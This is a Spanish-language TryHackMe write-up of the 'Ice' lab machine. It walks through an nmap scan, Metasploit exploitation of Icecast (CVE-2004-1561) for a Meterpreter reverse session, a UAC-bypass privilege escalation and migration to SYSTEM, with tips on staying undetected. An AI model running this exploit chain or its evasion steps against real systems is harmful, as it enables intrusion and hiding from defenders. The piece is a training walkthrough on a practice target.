# Writeup Ice - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.114.191.193` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Windows |
| **Dificultad** | Fácil |


---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Post-Explotación](#post-explotación)
   - [Extracción de Credenciales con Mimikatz](#extracción-de-credenciales-con-mimikatz)
6. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, como en el writeup anterior, es realizar un escaneo del objetivo para saber que puertos tiene abiertos y plantear nuestro ataque.
```bash
arch_donan@fedora:~$ sudo nmap -sS -A -Pn 10.114.191.193 -oN scan_ice.txt


```

### Resultados del Escaneo

```bash
# Nmap 7.92 scan initiated Thu Mar 12 13:15:43 2026 as: nmap -sS -A -Pn -oN scan_ice.txt 10.114.191.193
Nmap scan report for 10.114.191.193
Host is up (0.051s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2026-03-12T12:17:15+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2026-03-11T12:12:33
|_Not valid after:  2026-09-10T12:12:33
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


Network Distance: 3 hops
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:0d:a9:fe:eb:95 (unknown)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-12T12:17:00
|_  start_date: 2026-03-12T12:11:59

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   52.03 ms 192.168.128.1
2   ...
3   55.17 ms 10.114.191.193

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 12 13:17:15 2026 -- 1 IP address (1 host up) scanned in 91.80 seconds


```

Vaya, vaya, si tenemos otra vez la misma vulnerabilidad en esta máquina, que en la Blue, la MS17-010, y también llama bastante la atención el puerto 8000, que es el puerto de Icecast, que es un servidor de streaming multimedia de código abierto, por lo que prácticamente tenemos la puerta abierta para poder entrar a la máquina sin demasiado esfuerzo... 

Vamos a intentar acceder al servidor multimedia por el puerto 8000, a ver que versión tiene para poder buscar vulnerabilidades en Metasploit.
---

## Explotación de la vulnerabilidad

Al buscar durante menos de 20 segundos por exploit y nombre Icecast, hemos encontrado el candidato perfecto para explotar la vulnerabilidad
```bash
# Búsqueda en Metasploit
msfconsole
search type:exploit name:icecast

```

El módulo encontrado es:

| Módulo | Descripción |
| :--- | :--- |
| `exploit/windows/http/icecast_header` | Icecast Header Overwrite (CVE-2004-1561) |


![icecast](/imgIce/image.png)

*Buena candidata localizada para el acceso inicial.*

---

## Explotación

Seleccionamos el exploit de Icecast y configuramos los parámetros necesarios para obtener una sesión de Meterpreter.

```bash
use exploit/windows/http/icecast_header
show options

```

![Opciones del exploit Icecast](img2/2026-03-05%2010_13_04-kali-linux-2025.3-virtualbox-amd64%20(Instant%C3%A1nea%202)%20%5BCorriendo%5D%20-%20Oracle%20VirtualB.png)
*Opciones de configuración del exploit icecast_header.*

```bash
set RHOSTS 10.112.161.80
set LHOST 192.168.168.157

```

![Configuración de LHOST e inicio del exploit](img2/2026-03-05%2010_13_40-kali-linux-2025.3-virtualbox-amd64%20(Instant%C3%A1nea%202)%20%5BCorriendo%5D%20-%20Oracle%20VirtualB.png)
*Configuración del exploit con RHOSTS y LHOST.*

```bash
run

```
¡Bingo! Hemos entrado en el sistema a través del servicio Icecast. De momento solo tenemos acceso como usuario, pero ya podemos empezar a mover fichas para conseguir privilegios de administrador.

```bash
meterpreter > getuid
Server username: Dark-PC\Dark

```
![Estamos dentro](/imgIce/image3.png)

*Resultado de la ejecución del comando getuid.*

```bash
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

```

---

## Escalada de Privilegios

Vale, ya tenemos acceso inicial a la máquina, para poder escalar privilegios para obtener el ansiado acceso de administrador, vamos a usar una herramienta interesante llamada "local_exploit_suggester", que escaneará nuestra sesión automáticamente y nos dirá si hay alguna vulnerabilidad que podamos explotar.

```bash
1   exploit/windows/local/bypassuac_comhijack                         Yes            The target appears to be vulnerable.
2   exploit/windows/local/bypassuac_eventvwr                          Yes            The target appears to be vulnerable.
3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move      Yes            The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
4   exploit/windows/local/ms10_092_schelevator                        Yes            The service is running, but could not be validated.
5   exploit/windows/local/ms13_053_schlamperei                        Yes            The target appears to be vulnerable.
6   exploit/windows/local/ms13_081_track_popup_menu                   Yes            The target appears to be vulnerable.
7   exploit/windows/local/ms14_058_track_popup_menu                   Yes            The target appears to be vulnerable.
8   exploit/windows/local/ms15_051_client_copy_image                  Yes            The target appears to be vulnerable.
9   exploit/windows/local/ntusermndragover                            Yes            The target appears to be vulnerable.
10  exploit/windows/local/ppr_flatten_rec                             Yes            The target appears to be vulnerable.
11  exploit/windows/local/tokenmagic                                  Yes            The target appears to be vulnerable.
12  exploit/windows/persistence/registry                              Yes            The target is vulnerable. Registry writable
13  exploit/windows/persistence/startup_folder                        Yes            The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\Dark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
Parece que nos ha sugerido que podemos explotar 13 vulnerabilidades, pero en un escenario real, no iríamos como locos a intentar hacer todas del tirón, ya que podría despertar muchas sospechas y hacer bastante ruido en la red, por lo que lo mejor sería es investigar las vulnerabilidades con la información obtenida hasta ahora y ver cual sería la más adecuada en nuestro caso.

Un pequeño consejo, podemos investigar las vulnerabilidades a partir de la información obtenida en el escaneo de nmap, a partir de la versión del SO. En mi caso, la mejor opción sería bypassear el UAC, ya que es una vulnerabilidad que no deja rastro y es muy difícil de detectar.

```bash
msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> set lhost 192.168.130.81
lhost => 192.168.130.81
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> set lport 4445
lport => 4445
```
Al correr el exploit para escalar privilegios, obtuvimos los preciados privilegios de administrador, pero manteniendo el usuario Dark.

```bash
Meterpreter 2)(C:\Windows\system32) > getuid
Server username: Dark-PC\Dark
(Meterpreter 2)(C:\Windows\system32) > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
Opcionalmente, si queremos camuflarnos y no levantar sospechas en el ordenador, podemos migrar a un proceso que esté siendo ejecutado por el sistema. Para ello, se usa ```migrate <PID>```. Y al migrar, podemos ver que ya somos SYSTEM.

```bash
(Meterpreter 2)(C:\Windows\system32) > migrate 584
[*] Migrating from 2116 to 584...
[*] Migration completed successfully.
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```